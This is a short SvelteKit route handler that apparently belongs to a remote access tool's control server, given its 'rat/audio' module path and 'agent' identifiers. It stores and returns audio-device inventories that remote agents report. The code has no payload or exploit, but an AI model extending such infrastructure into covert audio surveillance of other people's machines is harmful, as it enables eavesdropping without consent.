import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { audioBridgeManager, AudioBridgeError } from '$lib/server/rat/audio';
import type { AudioDeviceInventory } from '$lib/types/audio';

export const GET: RequestHandler = ({ params }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const state = audioBridgeManager.getInventoryState(id);
	return json(state);
};

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: AudioDeviceInventory;
	try {
		payload = (await request.json()) as AudioDeviceInventory;
	} catch (err) {
		throw error(400, 'Invalid audio inventory payload');
	}

	try {
		audioBridgeManager.updateInventory(id, payload);
	} catch (err) {
		if (err instanceof AudioBridgeError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to update audio inventory');
	}

	return json({ accepted: true });
};
